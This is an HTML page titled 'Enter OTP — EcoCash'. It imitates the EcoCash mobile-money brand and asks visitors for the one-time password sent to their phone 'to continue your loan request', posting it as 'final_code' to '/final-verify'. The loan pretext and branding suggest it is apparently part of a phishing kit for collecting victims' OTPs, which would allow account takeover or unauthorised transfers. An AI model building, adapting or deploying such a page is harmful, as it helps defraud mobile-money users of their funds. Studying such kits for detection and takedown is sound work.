<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enter OTP — EcoCash</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        :root {
            --bg: #0b1118;
            --card: #121b26;
            --elevated: #182433;
            --accent: #00b86b;
            --accent-hover: #009e5b;
            --text: #f4f7fb;
            --muted: #94a3b8;
            --border: rgba(255, 255, 255, 0.08);
        }
        body {
            margin: 0;
            min-height: 100vh;
            background: radial-gradient(circle at top, #132234 0%, var(--bg) 65%);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px 16px;
        }
        .card-modern {
            width: 100%;
            max-width: 420px;
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 22px;
            padding: 26px 20px;
            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
        }
        .otp-input {
            background: var(--elevated);
            border: 1.5px solid rgba(255,255,255,0.14);
            color: var(--text);
            border-radius: 14px;
            padding: 14px;
            font-size: 1.2rem;
            font-weight: 700;
            letter-spacing: 0.25em;
            text-align: center;
            width: 100%;
        }
        .otp-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0, 184, 107, 0.2);
        }
        .btn-eco {
            background: var(--accent);
            color: #05120c;
            font-weight: 700;
            border: none;
            border-radius: 14px;
            padding: 14px;
            width: 100%;
        }
        .btn-eco:hover { background: var(--accent-hover); color: #05120c; }
    </style>
</head>
<body>
    <div class="card-modern">
        <h2 class="fw-bold fs-4 text-center mb-2">Verify OTP</h2>
        <p class="small text-center mb-4" style="color: var(--muted);">
            Enter the OTP sent to your phone to continue your loan request.
        </p>

        <form action="/final-verify" method="POST">
            <div class="mb-4">
                <input type="text" inputmode="numeric" name="final_code" class="otp-input"
                    placeholder="••••••" maxlength="10" required>
            </div>
            <button type="submit" class="btn-eco shadow-sm">Submit OTP</button>
        </form>
    </div>
</body>
</html>
